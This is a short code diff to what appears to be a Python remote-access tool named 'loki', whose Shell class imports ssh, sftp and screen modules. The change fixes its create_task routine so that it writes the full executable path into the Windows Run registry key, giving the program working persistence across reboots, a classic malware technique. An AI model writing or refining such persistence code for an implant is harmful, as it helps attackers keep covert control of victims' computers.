@@ -5,9 +5,9 @@
 import sys 
 import socket
 import subprocess
+from os import chdir
 from time import sleep
 from queue import Queue
-from os import chdir, path 
 from . import ssh, sftp, screen
 from threading import Thread, RLock 
 
@@ -135,7 +135,7 @@ class Shell(object):
 
  def create_task(self, args):
   if hasattr(sys, 'frozen'):
-   _path = path.basename(sys.executable)
+   _path = sys.executable
    cmd = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f /d "{}"'.format(_path)
    subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
